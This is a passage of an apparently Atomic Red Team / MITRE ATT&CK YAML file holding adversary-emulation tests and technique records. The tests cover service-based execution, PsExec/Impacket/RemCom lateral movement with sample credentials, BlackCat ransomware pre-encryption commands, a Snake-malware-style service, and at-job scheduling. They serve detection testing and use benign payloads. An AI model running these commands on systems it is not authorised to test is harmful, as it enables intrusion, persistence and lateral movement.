    - name: Execute a Command as a Service
      auto_generated_guid: 2382dee2-a75f-49aa-9378-f52df6ed3fb1
      description: "Creates a service specifying an arbitrary command and executes
        it. When executing commands such as PowerShell, the service will report that
        it did not start correctly even when code executes properly.\n\nUpon successful
        execution, cmd.exe creates a new service using sc.exe that will start powershell.exe
        to create a new file `art-marker.txt`\n\n[BlackCat Ransomware (ALPHV)](https://www.varonis.com/blog/blackcat-ransomware)
        \ \n[Cybereason vs. BlackCat Ransomware](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)\n"
      supported_platforms:
      - windows
      input_arguments:
        service_name:
          description: Name of service to create
          type: string
          default: ARTService
        executable_command:
          description: Command to execute as a service
          type: string
          default: "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType
            File C:\\art-marker.txt"
      executor:
        command: |
          sc.exe create #{service_name} binPath= "#{executable_command}"
          sc.exe start #{service_name}
          sc.exe delete #{service_name}
        cleanup_command: 'del C:\art-marker.txt >nul 2>&1

          '
        name: command_prompt
        elevation_required: true
    - name: Use PsExec to execute a command on a remote host
      auto_generated_guid: 873106b7-cfed-454b-8680-fa9f6400431c
      description: |
        Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments
        Will start a process on a remote host.

        Upon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).
      supported_platforms:
      - windows
      input_arguments:
        remote_host:
          description: Remote hostname or IP address
          type: string
          default: localhost
        user_name:
          description: Username
          type: string
          default: DOMAIN\Administrator
        password:
          description: Password
          type: string
          default: P@ssw0rd1
        psexec_exe:
          description: Path to PsExec
          type: string
          default: C:\PSTools\PsExec.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'PsExec tool from Sysinternals must exist on disk at specified
          location (#{psexec_exe})

          '
        prereq_command: 'if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}

          '
        get_prereq_command: |
          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
          New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
      executor:
        command: '#{psexec_exe} \\#{remote_host} -u #{user_name} -p #{password} -accepteula
          "C:\Windows\System32\calc.exe"

          '
        name: command_prompt
    - name: psexec.py (Impacket)
      auto_generated_guid: edbcd8c9-3639-4844-afad-455c91e95a35
      description: 'Will execute a command on the remote host with Impacket psexec.py
        script.

        '
      supported_platforms:
      - linux
      input_arguments:
        remote_host:
          description: Remote hostname or IP address
          type: string
          default: 127.0.0.1
        username:
          description: Username
          type: string
          default: Administrator
        domain:
          description: Target domain
          type: string
          default: ''
        password:
          description: Password
          type: string
          default: P@ssw0rd1
        command:
          description: Command to execute in target computer
          type: string
          default: whoami
      dependency_executor_name: bash
      dependencies:
      - description: 'psexec.py (Impacket)

          '
        prereq_command: 'if [ -x "$(command -v psexec.py)" ]; then exit 0; else exit
          1; fi;

          '
        get_prereq_command: 'sudo pip3 install impacket

          '
      executor:
        command: 'psexec.py ''#{domain}/#{username}:#{password}@#{remote_host}'' ''#{command}''

          '
        name: bash
    - name: BlackCat pre-encryption cmds with Lateral Movement
      auto_generated_guid: 31eb7828-97d7-4067-9c1e-c6feb85edc4b
      description: This atomic attempts to emulate the unique behavior of BlackCat
        ransomware prior to encryption and during Lateral Movement attempts via PsExec
        on Windows. Uses bundled PsExec like BlackCat
      supported_platforms:
      - windows
      input_arguments:
        targethost:
          description: Target hostname to attempt psexec connection to for emulation
            of lateral movement.
          type: string
          default: "$ENV:COMPUTERNAME"
      executor:
        command: "cmd.exe /c \"wmic \tcsproduct \tget UUID\" \ncmd.exe /c \"fsutil
          behavior \tset SymlinkEvaluation R2L:1\" \ncmd.exe /c \"fsutil behavior
          set \tSymlinkEvaluation R2R:1\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters
          \   /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy $pathtoatomicsfolder\\T1569.002\\bin\\PsExec.exe
          $env:temp\ncmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\#{targethost}
          cmd.exe  /c echo \"--access-token\"\"\n"
        cleanup_command: "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters
          /v MaxMpxCt /f\ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:0\"
          \ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"\nrm $env:temp\\psexec.exe\n"
        name: powershell
        elevation_required: true
    - name: Use RemCom to execute a command on a remote host
      auto_generated_guid: a5d8cdeb-be90-43a9-8b26-cc618deac1e0
      description: |
        Requires having RemCom installed, path to RemCom is one of the input input_arguments
        Will start a process on a remote host.
        Upon successful execution, cmd will utilize RemCom.exe to spawn calc.exe on a remote endpoint (default:localhost).
      supported_platforms:
      - windows
      input_arguments:
        remote_host:
          description: Remote hostname or IP address
          type: string
          default: localhost
        user_name:
          description: Username
          type: string
          default: Administrator
        password:
          description: Password
          type: string
          default: P@ssw0rd1
        remcom_exe:
          description: Path to RemCom
          type: string
          default: "$pathtoatomicsfolder\\T1569.002\\bin\\remcom.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: 'RemCom tool must exist on disk at specified location (#{remcom_exe})

          '
        prereq_command: 'if (Test-Path "#{remcom_exe}") { exit 0} else { exit 1}

          '
        get_prereq_command: 'Invoke-WebRequest "https://github.com/kavika13/RemCom/raw/master/bin/Release/RemCom.exe"
          -OutFile "#{remcom_exe}"

          '
      executor:
        command: '"#{remcom_exe}" \\#{remote_host} /user:#{user_name} /pwd:#{password}
          cmd.exe

          '
        name: command_prompt
    - name: Snake Malware Service Create
      auto_generated_guid: b8db787e-dbea-493c-96cb-9272296ddc49
      description: "The following Atomic Test will create a new service named WerFaultSvc
        with a binary path of WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe.\nThis
        was recently seen in the Snake Malware report. \nUpon execution, sc.exe will
        create a new service named WerFaultSvc with a bin path \\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe
        and a display name of WerFault Service.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)
        \ \n"
      supported_platforms:
      - windows
      executor:
        command: 'sc.exe create "WerFaultSvc" binPath= "$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe"
          DisplayName= "WerFault Service" start= auto

          '
        cleanup_command: 'sc.exe delete "WerFaultSvc"

          '
        name: command_prompt
        elevation_required: true
  T1053.002:
    technique:
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0
      created: '2019-11-27T13:52:45.853Z'
      x_mitre_version: '2.0'
      external_references:
      - source_name: mitre-attack
        external_id: T1053.002
        url: https://attack.mitre.org/techniques/T1053/002
      - source_name: rowland linux at 2019
        url: https://www.linkedin.com/pulse/getting-attacker-ip-address-from-malicious-linux-job-craig-rowland/
        description: Craig Rowland. (2019, July 25). Getting an Attacker IP Address
          from a Malicious Linux At Job. Retrieved October 15, 2021.
      - source_name: GTFObins at
        url: https://gtfobins.github.io/gtfobins/at/
        description: Emilio Pinna, Andrea Cardaci. (n.d.). gtfobins at. Retrieved
          September 28, 2021.
      - source_name: Linux at
        url: https://man7.org/linux/man-pages/man1/at.1p.html
        description: IEEE/The Open Group. (2017). at(1p) — Linux manual page. Retrieved
          February 25, 2022.
      - source_name: Twitter Leoloobeek Scheduled Task
        url: https://twitter.com/leoloobeek/status/939248813465853953
        description: Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved
          December 12, 2017.
      - source_name: Microsoft Scheduled Task Events Win10
        url: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events
        description: Microsoft. (2017, May 28). Audit Other Object Access Events.
          Retrieved June 27, 2019.
      - source_name: TechNet Scheduled Task Events
        url: https://technet.microsoft.com/library/dd315590.aspx
        description: Microsoft. (n.d.). General Task Registration. Retrieved December
          12, 2017.
      - source_name: TechNet Autoruns
        url: https://technet.microsoft.com/en-us/sysinternals/bb963902
        description: Russinovich, M. (2016, January 4). Autoruns for Windows v13.51.
          Retrieved June 6, 2016.
      - source_name: TechNet Forum Scheduled Task Operational Setting
        url: https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen
        description: Satyajit321. (2015, November 3). Scheduled Tasks History Retention
          settings. Retrieved December 12, 2017.
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.

        On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)

        Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).

        In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)
      modified: '2022-04-18T20:12:04.110Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: 'Scheduled Task/Job: At'
      x_mitre_detection: "Monitor process execution from the svchost.exe in Windows
        10 and the Windows Task Scheduler taskeng.exe for older versions of Windows.
        (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used
        for persistence, then the adversary is likely to remove the task when the
        action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks
        for change entries related to scheduled tasks that do not correlate with known
        software, patch cycles, etc.\n\nConfigure event logging for scheduled task
        creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\"
        setting within the event logging service. (Citation: TechNet Forum Scheduled
        Task Operational Setting) Several events will then be logged on scheduled
        task activity, including: (Citation: TechNet Scheduled Task Events)(Citation:
        Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server
        2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008
        R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID
        141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled
        task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task
        created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n*
        Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools
        such as Sysinternals Autoruns may also be used to detect system changes that
        could be attempts at persistence, including listing current scheduled tasks.
        (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features
        may interact directly with the Windows API to perform these functions outside
        of typical system utilities. Tasks may also be created through Windows system
        management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
        and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional
        logging may need to be configured to gather the appropriate data.\n\nIn Linux
        and macOS environments, monitor scheduled task creation using command-line
        invocation. Legitimate scheduled tasks may be created during installation
        of new software or through system administration functions. Look for changes
        to tasks that do not correlate with known software, patch cycles, etc. \n\nReview
        all jobs using the <code>atq</code> command and ensure IP addresses stored
        in the <code>SSH_CONNECTION</code> and <code>SSH_CLIENT</code> variables,
        machines that created the jobs, are trusted hosts. All [at](https://attack.mitre.org/software/S0110)
        jobs are stored in <code>/var/spool/cron/atjobs/</code>.(Citation: rowland
        linux at 2019)\n\nSuspicious program execution through scheduled tasks may
        show up as outlier processes that have not been seen before when compared
        against historical data. Data and events should not be viewed in isolation,
        but as part of a chain of behavior that could lead to other activities, such
        as network connections made for [Command and Control](https://attack.mitre.org/tactics/TA0011),
        learning details about the environment through [Discovery](https://attack.mitre.org/tactics/TA0007),
        and [Lateral Movement](https://attack.mitre.org/tactics/TA0008)."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'Scheduled Job: Scheduled Job Creation'
      - 'Process: Process Creation'
      - 'File: File Modification'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - Administrator
      - User
      x_mitre_remote_support: true
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1053.002
    atomic_tests:
    - name: At.exe Scheduled task
      auto_generated_guid: 4a6c0dc4-0f2a-4203-9298-a5a9bdc21ed8
      description: |
        Executes cmd.exe
        Note: deprecated in Windows 8+

        Upon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.
      supported_platforms:
      - windows
      executor:
        name: command_prompt
        elevation_required: false
        command: 'at 13:20 /interactive cmd

          '
    - name: At - Schedule a job
      auto_generated_guid: 7266d898-ac82-4ec0-97c7-436075d0d08e
      description: 'This test submits a command to be run in the future by the `at`
        daemon.

        '
      supported_platforms:
      - linux
      input_arguments:
        time_spec:
          description: Time specification of when the command should run
          type: string
          default: now + 1 minute
        at_command:
          description: The command to be run
          type: string
          default: echo Hello from Atomic Red Team
      dependency_executor_name: sh
      dependencies:
      - description: 'The `at` and `atd` executables must exist in the PATH

          '
        prereq_command: 'which at && which atd

          '
        get_prereq_command: 'echo ''Please install `at` and `atd`; they were not found
          in the PATH (Package name: `at`)''

          '
      - description: 'The `atd` daemon must be running

          '
        prereq_command: 'systemctl status atd || service atd status

          '
        get_prereq_command: 'echo ''Please start the `atd` daemon (sysv: `service
          atd start` ; systemd: `systemctl start atd`)''

          '
      executor:
        name: sh
        elevation_required: false
        command: 'echo "#{at_command}" | at #{time_spec}'
  T1035:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f44731de-ea9f-406d-9b83-30ecbb9b4392
      type: attack-pattern
      created: '2017-05-31T21:30:36.550Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1035
        external_id: T1035
      modified: '2020-03-10T18:34:39.665Z'
      name: Service Execution
      description: Adversaries may execute a binary, command, or script via a method
        that interacts with Windows services, such as the Service Control Manager.
        This can be done by either creating a new service or modifying an existing
        service. This technique is the execution used in conjunction with [New Service](https://attack.mitre.org/techniques/T1050)
        and [Modify Existing Service](https://attack.mitre.org/techniques/T1031) during
        service persistence or privilege escalation.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: Changes to service Registry entries and command-line invocation
        of tools capable of modifying services that do not correlate with known software,
        patch cycles, etc., may be suspicious. If a service is used only to execute
        a binary or script and not to persist, then it will likely be changed back
        to its original form shortly after the service is restarted so the service
        is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      x_mitre_remote_support: true
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1086:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Praetorian
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0
      type: attack-pattern
      created: '2017-05-31T21:31:06.512Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1086
        url: https://attack.mitre.org/techniques/T1086
      - url: https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx
        description: Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April
          28, 2016.
        source_name: TechNet PowerShell
      - url: https://github.com/mattifestation/PowerSploit
        description: PowerSploit. (n.d.). Retrieved December 4, 2014.
        source_name: Powersploit
      - url: https://github.com/jaredhaight/PSAttack
        description: Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.
        source_name: Github PSAttack
      - source_name: Sixdub PowerPick Jan 2016
        url: http://www.sixdub.net/?p=367
        description: Warner, J.. (2015, January 6). Inexorable PowerShell – A Red
          Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December
          8, 2018.
      - source_name: SilentBreak Offensive PS Dec 2015
        url: https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/
        description: Christensen, L.. (2015, December 28). The Evolution of Offensive
          PowerShell Invocation. Retrieved December 8, 2018.
      - source_name: Microsoft PSfromCsharp APR 2014
        url: https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/
        description: Babinec, K. (2014, April 28). Executing PowerShell scripts from
          C#. Retrieved April 22, 2019.
      - url: http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf
        description: Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING
          CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.
        source_name: Malware Archaeology PowerShell Cheat Sheet
      - url: https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html
        description: Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH
          POWERSHELL LOGGING. Retrieved February 16, 2016.
        source_name: FireEye PowerShell Logging 2016
      modified: '2020-03-09T13:51:06.334Z'
      name: PowerShell
      description: "PowerShell is a powerful interactive command-line interface and
        scripting environment included in the Windows operating system. (Citation:
        TechNet PowerShell) Adversaries can use PowerShell to perform a number of
        actions, including discovery of information and execution of code. Examples
        include the Start-Process cmdlet which can be used to run an executable and
        the Invoke-Command cmdlet which runs a command locally or on a remote computer.
        \n\nPowerShell may also be used to download and run executables from the Internet,
        which can be executed from disk or in memory without touching disk.\n\nAdministrator
        permissions are required to use PowerShell to connect to remote systems.\n\nA
        number of PowerShell-based offensive testing tools are available, including
        [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation:
        Powersploit) and PSAttack. (Citation: Github PSAttack)\n\nPowerShell commands/scripts
        can also be executed without directly invoking the powershell.exe binary through
        interfaces to PowerShell's underlying System.Management.Automation assembly
        exposed through the .NET framework and Windows Common Language Interface (CLI).
        (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec
        2015) (Citation: Microsoft PSfromCsharp APR 2014)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.

        Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)

        It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features. (Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      - Administrator
      x_mitre_remote_support: true
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1118:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Casey Smith
      - Travis Smith, Tripwire
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f792d02f-813d-402b-86a5-ab98cb391d3b
      type: attack-pattern
      created: '2017-05-31T21:31:27.510Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - external_id: T1118
        url: https://attack.mitre.org/techniques/T1118
        source_name: mitre-attack
      - source_name: MSDN InstallUtil
        description: Microsoft. (n.d.). Installutil.exe (Installer Tool). Retrieved
          July 1, 2016.
        url: https://msdn.microsoft.com/en-us/library/50614e95.aspx
      - source_name: LOLBAS Installutil
        url: https://lolbas-project.github.io/lolbas/Binaries/Installutil/
        description: LOLBAS. (n.d.). Installutil.exe. Retrieved July 31, 2019.
      modified: '2020-01-31T18:59:38.256Z'
      name: InstallUtil
      description: |-
        InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>. InstallUtil.exe is digitally signed by Microsoft.

        Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)
      kill_chain_phases:
      - phase_name: defense-evasion
        kill_chain_name: mitre-attack
      - phase_name: execution
        kill_chain_name: mitre-attack
      x_mitre_detection: Use process monitoring to monitor the execution and arguments
        of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior
        history of known good arguments and executed binaries to determine anomalous
        and potentially adversarial activity. Command arguments used before and after
        the InstallUtil.exe invocation may also be useful in determining the origin
        and purpose of the binary being executed.
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Process whitelisting
      - Digital Certificate Validation
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
